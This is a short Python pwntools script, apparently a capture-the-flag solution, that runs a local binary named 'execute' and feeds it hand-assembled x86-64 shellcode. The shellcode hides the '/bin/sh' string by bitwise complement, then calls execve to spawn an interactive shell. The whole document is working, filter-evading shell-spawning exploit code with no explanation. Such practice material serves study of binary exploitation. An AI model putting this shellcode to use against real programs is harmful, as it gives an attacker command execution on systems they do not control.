#!/usr/bin/python3
from pwn import process, context, asm

shell = process("./execute")
context.arch = "amd64"

shellcode  = b""
shellcode += asm("mov rax, 0xff978cd091969dd0")
shellcode += asm("push 0xffffffffffffffff")
shellcode += asm("xor rax, [rsp]")
shellcode += asm("push rax")
shellcode += asm("mov rdi, rsp")
shellcode += asm("cdq")
shellcode += asm("push rdx")
shellcode += asm("pop rsi")
shellcode += asm("push 0x3c")
shellcode += asm("pop rax")
shellcode += asm("dec al")
shellcode += asm("syscall")

shell.sendafter(b"\n", shellcode)
shell.interactive()
